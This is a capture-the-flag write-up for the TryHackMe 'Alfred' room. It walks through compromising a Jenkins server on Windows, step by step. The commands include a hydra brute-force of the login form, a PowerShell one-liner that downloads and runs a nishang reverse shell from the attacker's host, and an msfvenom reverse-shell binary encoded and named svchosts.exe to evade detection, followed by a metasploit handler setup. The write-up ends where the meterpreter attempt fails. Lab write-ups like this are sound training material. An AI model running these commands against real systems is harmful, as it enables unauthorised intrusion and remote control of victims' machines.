# THM - Alfred Write-Up

"In this room, we'll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we'll use an interesting privilege escalation method to get full system access."

## Task 1: Initial Access

**How many ports are open? (TCP only)**

As always, we're going to start with a aggressive nmap scan on all ports with very verbose output.

```
nmap 10.10.27.251 -p- -A -vv
```

Running this scan, we've come across an issue. The box is blocking the ping probes. We can get around this by adding -Pn to the end of our nmap to skip host discovery.

Success, we can now see that there are 3 open ports. Luckily, they're all useful.

* 8080
* 3389
* 80

While we wait for the SYN Stealth Scan, let's go checkout the website on port 80.

We can gather some information from the site, **alfred@wayneenterprises[.]com**

**What is the username and password for the log in panel(in the format username:password)**

From the website, we can assume that a username will be alfred. We also have the domain of the emails which may be needed later. Unfortunately, I see no extra information from the source.

Now that the nmap is complete, we can see that this is a Microsoft Windows Server 2012 R2 that is running Jetty(9.4.z-SNAPSHOT) on port 8080. Let's try to visit that port in our browser.

On MACHINE_IP:8080 we can see that there is a Jenkins login form. Let's try to find a way to login to alfred. When we view the source we can see the field names are j_username:j_password and that the error message displayed with incorrect credentials is "Invalid username or password". This will be useful if we need to use hydra to attempt to bruteforce the login form. 

Let's try to login to alfred with some common passwords to test if it will lock out the account for incorrect attempts. It looks like Jenkins doesn't have an attempt limit so let's try a bruteforce with the wellknown password list [rockyou.txt](https://www.kaggle.com/wjburns/common-password-list-rockyoutxt)

We're going to use hydra to do this but first we need to get the action and method.
* Action: j_acegi_security_check
* Method: Post

```
hydra -s 8080 -l afred -P /usr/share/wordlists/rockyou.txt 10.10.27.251 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Login=:Invalid username or password." 
```

Unfortunately, after a few minutes I'm going to be moving on from this. Let's go look at jenkins while this is running in the background and find out what the default administrative user is named. Maybe, we can get in with default credentials.

After some research, it looks like the default administrator username for jenkins is "admin". Let's run hydra with the http_default_pass.txt in metasploit wordlists to try and get into this account.

```
hydra -s 8080 -l admin -P /usr/share/wordlists/metasploit/http_default_pass.txt 10.10.27.251 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Login=:Invalid username or password."
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-17 11:51:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 19 login tries (l:1/p:19), ~2 tries per task
[DATA] attacking http-post-form://10.10.27.251:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Login=:Invalid username or password.
[8080][http-post-form] host: 10.10.27.251   login: admin   password: admin                                                                    
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-17 11:51:37

```

Perfect, not only did we get an account... we got access to the admin account.

Since earlier we saw that 3389 was open, let's take a shot in the dark and try to RDP with the admin:admin credentials. No luck here, but was worth a try.

Let's login on port 8080 and take a look around.
* Go to people section to look for other users - none seen.
* Go to credentials - nothing seen here
* Go to manage jenkins - this shows that there is a lot of vulnerabilities with this Jenkins server.
* Scroll down in manage jenkins to Configure Global Security and disable it, turn off CSRF Protection and save.

Let's now try to search for a way to execute commands on the server so we can try and get a shell.

If we go to jobs>project>configure we can scroll down to the Build section and see that it executes a Windows batch command. It looks like the default command is a whoami.

Lets test this out to get some information. If we go to builds and view the console output, we can see the result of our script.

```
Started by user unknown or anonymous
Running as SYSTEM
Building in workspace C:\Program Files (x86)\Jenkins\workspace\project
[project] $ cmd /c call C:\Users\bruce\AppData\Local\Temp\jenkins822259080465788895.bat

C:\Program Files (x86)\Jenkins\workspace\project>whoami
alfred\bruce

C:\Program Files (x86)\Jenkins\workspace\project>exit 0 
Finished: SUCCESS
```

So it looks like Jenkins executes the commands as system but is access to a user (alfred/bruce). Let's check and see if we can use powershell. We're in luck the cmd can launch powershell. Let's use [nishang](https://github.com/samratashok/nishang) and transfer Invoke-PowerShellTcp.ps1 to the server using Jenkins and a Simple HTTP server. We will want to launch a netcat listener before we do this, to pickup the shell.

* Move the terminals location to the directory containing Invoke-PowerShellTcp.ps1 and start the server (I made one for this room named Alfred).

```
python3 -m http.server
```

* Start netcat listener on port 4444 using rlwrap so that we can use the arrow keys to move around in the terminal once we get a shell.

```
rlwrap nc -lvnp 4444
```

* Update and build the following powershell that will transfer and execute the powershell script on the server.

```ps
powershell iex (New-Object Net.WebClient).DownloadString('http://Tun0-IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress Tun0-IP -Port 4444
```

WIN!

```
rlwrap nc -lvnp 9000                                                                                                                                        9 ⚙
listening on [any] 9000 ...
connect to [10.6.40.191] from (UNKNOWN) [10.10.27.251] 49355
```
```ps
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>systeminfo
```

**What is the user.txt flag?**

Now, we can begin looking for the user.txt flag! Use type user.txt to read the file in powershell.

## Task 2: Switching Shells

Now it's time to try and escalate our privileges. First, lets get an improved shell on the device. Let's use msfvenom to create a reverse shell. We're going to encode it and name it similarly to a legitimate binary service to avoid detection.

'''
msfvenom -p windows/shell_reverse_tcp LHOST=Tun0-IP LPORT=5555 -e x86/shikata_ga_nai -f exe -o svchosts.exe  
'''

**What is the final size of the exe payload that you generated?**

After creating the payload we will see the final size for our fake service in the output.

Now that we have our payload, we need to download it onto the device and access it through metasploit.

Let's download it using our powershell session we got earlier with netcat off the server. Navigate to C:\Perflogs and then transfer the file off the server.

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://Tun0-IP:8000/svchosts.exe','svchosts.exe')"
```

Now use ls to make sure it was transfered successfully. Perfect, we see svchosts.exe in PerfLogs.

Let's jump over and start up a metasploit session using exploit/multi/handler before we launch the binary.

Check to make sure the payload is correctly set to windows/meterpreter/reverse_tcp. It should be the default when opening msfconsole.

Show options and set the LPORT to 5555, along with the LHOST to the Tun0-IP. Run the exploit and execute the binary on the device with the powershell session you have.

```ps
Start-Process "svchosts.exe" 
```

Now, check your listener in metasploit and you should see the command shell session opened. Let's go ahead and view privileges with whoami /priv.

Luckily for us, we can see [SeDebugPrivilege, SeImpersonatePrivilege](https://www.exploit-db.com/papers/42556) are both enabled. Background the session, and use the metasploit incognito module. However, it is still not a meterpreter shell though. 

Let's see if we can upgrade our session using sessions -u 1. 

Let's try using Jenkins to run the binary as SYSTEM to get a meterpreter shell.

```ps
powershell Start-Process "svchosts.exe"
```

Unfortunately, I was unable to get this reverse shell to call back and it just hangs. This seemed to be a known issue for the room, so I will have to find another way to get a meterpreter shell.
